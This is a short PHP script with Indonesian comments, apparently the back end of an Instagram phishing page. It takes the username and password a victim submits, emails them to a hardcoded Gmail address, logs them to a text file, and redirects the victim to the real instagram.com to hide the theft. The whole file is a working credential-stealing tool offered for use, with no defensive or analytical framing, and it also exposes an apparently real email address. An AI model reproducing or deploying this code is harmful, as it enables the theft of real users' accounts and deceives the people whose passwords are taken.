<?php
$mailto = 'dendisaimam5@gmail.com';
$subjek = '= [ INSTAGRAM ] =';
$body = "<html><body><h1>++========[ SETOR AKUN INSTAGRAM ]========++<br><h1>Username :" . $_POST['username'] . "<br><h1>Password     : " . $_POST['password'] . "<br>++========[ SELAMAT MENIKMATI ]========++";


$headers = "From: MrcakilGans@ig.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); 

file_put_contents("LOG-ACCOUNT.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
